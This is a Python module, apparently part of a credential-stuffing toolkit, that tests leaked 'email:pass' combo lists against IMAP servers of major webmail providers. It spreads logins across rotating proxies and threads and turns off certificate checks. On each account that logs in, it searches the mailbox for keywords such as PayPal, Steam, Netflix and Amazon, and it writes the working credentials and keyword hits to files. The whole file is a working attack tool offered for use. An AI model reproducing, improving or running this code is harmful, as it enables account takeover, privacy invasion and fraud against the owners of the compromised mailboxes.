# modules/imap_checker.py
import imaplib
import ssl
import sys
import time
import re
import random
from pathlib import Path

from core.common import (
    banner, clear, session_dir, Writer, Stats, select_file,
    read_lines, norm_combo, dedupe, ask_threads, run_pool,
    Fore, Style, ROOT
)
from core.proxy import ProxyPool

try:
    import socks
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

DOMAIN_MAP = {
    'gmail.com': 'imap.gmail.com', 'googlemail.com': 'imap.gmail.com',
    'outlook.com': 'outlook.office365.com', 'hotmail.com': 'outlook.office365.com',
    'live.com': 'outlook.office365.com', 'msn.com': 'outlook.office365.com',
    'yahoo.com': 'imap.mail.yahoo.com', 'yahoo.co.uk': 'imap.mail.yahoo.com',
    'aol.com': 'imap.aol.com', 'icloud.com': 'imap.mail.me.com',
    'me.com': 'imap.mail.me.com', 'mac.com': 'imap.mail.me.com',
    'yandex.com': 'imap.yandex.com', 'yandex.ru': 'imap.yandex.ru',
    'mail.ru': 'imap.mail.ru', 'mail.com': 'imap.mail.com',
    'gmx.com': 'imap.gmx.com', 'gmx.net': 'imap.gmx.net',
    'web.de': 'imap.web.de', 't-online.de': 'secureimap.t-online.de',
    'orange.fr': 'imap.orange.fr', 'laposte.net': 'imap.laposte.net',
    'libero.it': 'imap.libero.it', 'virgilio.it': 'imap.virgilio.it',
    'wp.pl': 'imap.wp.pl', 'o2.pl': 'imap.o2.pl',
    'interia.pl': 'imap.interia.pl', 'onet.pl': 'imap.poczta.onet.pl',
    'zoho.com': 'imap.zoho.com', 'fastmail.com': 'imap.fastmail.com',
    'ukr.net': 'imap.ukr.net',
}

def server_for(email):
    d = email.split('@')[-1].lower()
    return DOMAIN_MAP.get(d, f"imap.{d}")

def load_keywords():
    p = ROOT / "keywords.txt"
    if not p.exists():
        p.write_text("Steam\nNetflix\nPayPal\nAmazon\nSecurity Alert\n", encoding='utf-8')
    words = [w.strip().lower() for w in read_lines(p) if w.strip()]
    return words or ["steam", "netflix", "paypal"]

def search_keywords(imap, keywords, timeout_s=20):
    out = {}
    deadline = time.time() + timeout_s
    for kw in keywords:
        if time.time() > deadline:
            break
        try:
            ok, data = imap.search(None, f'BODY "{kw}"')
            if ok != "OK" or not data or not data[0]:
                ok, data = imap.search(None, f'TEXT "{kw}"')
            if ok == "OK" and data and data[0]:
                n = len(data[0].split())
                if n:
                    out[kw] = n
        except Exception:
            continue
    return out

def _parse_proxy(proxy_url):
    """Return (host, port, user, pw, is_socks) or None."""
    if not proxy_url:
        return None
    m = re.match(r'^(http|https|socks4|socks5)://(?:([^:]+):([^@]+)@)?([^:]+):(\d+)$', proxy_url)
    if not m:
        return None
    scheme, user, pw, host, port = m.groups()
    return (host, int(port), user, pw, scheme.startswith('socks'))

def check_one(combo, keywords, stats, writer, timeout, pool: ProxyPool):
    try:
        email, password = combo.split(':', 1)
    except ValueError:
        stats.add("errors"); stats.add("checked"); return

    host = server_for(email)
    proxy_url = pool.get() if len(pool) else None
    proxy_used = proxy_url
    socks_proxy = _parse_proxy(proxy_url) if proxy_url else None

    imap = None
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        if socks_proxy and HAS_SOCKS and socks_proxy[4]:
            # route IMAP through SOCKS proxy
            import socks as _socks
            sock = _socks.socksocket()
            sock.set_proxy(_socks.SOCKS5, socks_proxy[0], socks_proxy[1],
                           username=socks_proxy[2], password=socks_proxy[3])
            sock.settimeout(timeout)
            sock.connect((host, 993))
            imap = imaplib.IMAP4_SSL(host, 993, ssl_context=ctx, sock=sock)
        else:
            imap = imaplib.IMAP4_SSL(host, 993, ssl_context=ctx, timeout=timeout)

        try:
            imap.login(email, password)
        except imaplib.IMAP4.error:
            pool.mark_ok(proxy_used)
            stats.add("invalid"); stats.add("checked")
            return

        try:
            imap.select("INBOX")
        except Exception:
            pass

        hits = search_keywords(imap, keywords)
        try:
            ok, data = imap.search(None, "ALL")
            total = len(data[0].split()) if ok == "OK" and data and data[0] else 0
        except Exception:
            total = 0

        pool.mark_ok(proxy_used)
        line = f"{email}:{password}"
        writer.write("valid_imap.txt", line)
        stats.add("valid")

        if hits:
            stats.add("keyword_hit")
            pretty = ", ".join(f"{k}:{v}" for k, v in hits.items())
            writer.write("hits_keywords.txt", f"{line} | {pretty} | total {total}")
            for k, v in hits.items():
                safe = re.sub(r'[^A-Za-z0-9._-]', '_', k)
                writer.write(f"Keywords/{safe}.txt", f"{line} | {k}:{v} | total {total}")
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {line} "
                  f"{Fore.LIGHTBLACK_EX}| {pretty} | {total}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {line} "
                  f"{Fore.LIGHTBLACK_EX}| valid | {total}{Style.RESET_ALL}")

    except (imaplib.IMAP4.error, ssl.SSLError):
        pool.mark_fail(proxy_used)
        stats.add("invalid")
    except Exception:
        pool.mark_fail(proxy_used)
        stats.add("errors")
    finally:
        try:
            if imap:
                imap.logout()
        except Exception:
            pass
        stats.add("checked")

def main():
    clear()
    banner("imap keyword checker")

    path = select_file("select combo file (email:pass)")
    if not path:
        print(f"{Fore.RED}[!] no file{Style.RESET_ALL}"); input("enter..."); return

    raw = [norm_combo(l) for l in read_lines(path)]
    raw = [r for r in raw if r]
    combos, dupes = dedupe(raw)
    if not combos:
        print(f"{Fore.RED}[!] no valid combos{Style.RESET_ALL}"); input("enter..."); return

    keywords = load_keywords()
    from core.proxy import load_pool_interactive
    pool = load_pool_interactive()
    threads = ask_threads(50)
    timeout = 15

    out = session_dir("imap")
    writer = Writer(out)
    stats = Stats(total=len(combos), keys=["keyword_hit"])

    print(f"{Fore.CYAN}[*] combos {len(combos)} | dupes {dupes} | keywords {len(keywords)} "
          f"| threads {threads} | proxies {len(pool)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] results -> {out}{Style.RESET_ALL}\n")

    run_pool(combos, lambda c: check_one(c, keywords, stats, writer, timeout, pool),
             threads, stats, name="imap")

    writer.close()
    print(f"\n{Fore.GREEN}[+] done | valid {stats.get('valid')} | keyword hits {stats.get('keyword_hit')} "
          f"| invalid {stats.get('invalid')} | errors {stats.get('errors')}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] {out}{Style.RESET_ALL}")
    input("enter...")

if __name__ == "__main__":
    main()
